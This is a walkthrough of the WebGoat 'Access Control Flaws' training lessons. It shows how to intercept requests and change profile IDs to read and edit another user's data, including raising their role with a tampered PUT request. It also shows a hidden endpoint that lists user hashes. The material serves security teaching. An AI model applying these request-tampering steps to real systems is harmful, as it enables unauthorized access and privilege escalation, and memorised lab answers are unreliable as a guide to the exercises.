# Access Control Flaws

## Insecure Direct Object References #1
Just log in with the credentials tom/cat, as instructed.

## Insecure Direct Object References #2
Intercept the HTTP request with Wireshark/Fiddler, and read the response’s body:
```json
{
  "role": 3,
  "color": "yellow",
  "size": "small",
  "name": "Tom Cat",
  "userId": "2342384"
}
```
The fields, that were not displayed, are role and userId.

## Insecure Direct Object References #3
The REST path to the profile is /WebGoat/IDOR/profile/2342384, as visible after intercepting the HTTP requests.

## Insecure Direct Object References #4
View Another Profile: Intercept the GET request with ZAP, and edit the /profile/userId path to /profile/2342388 in order to find another person’s profile.

Edit Another Profile: Intercept the request and tamper it in the following way:

PUT /WebGoat/IDOR/profile/2342388
Content-Type: application/json
```json
{
  "role": 1,
  "color": "red",
  "size": "large",
  "name": "Buffalo Bill",
  "userId": 2342388
}
```
## Missing Function Level Access Control #1
The values are Users and Config, as found in the section of HTML wrapped with a class hidden* (did not find out exactly which one, but I do not need that information).
![](./Img/function_level_access_control_1.png)
* Options hidden in the UI.

## Missing Function Level Access Control #2
Send a GET request to /WebGoat/users with the Content-Type set to application/json. You will receive the following response:
```json
[
    {
        "username": "johndoe",
        "admin": false,
        "userHash": "bOsZfbase64z804CSVl1vp5BR/RXybAAbEr5+X4lWQ8="
    }
]
```
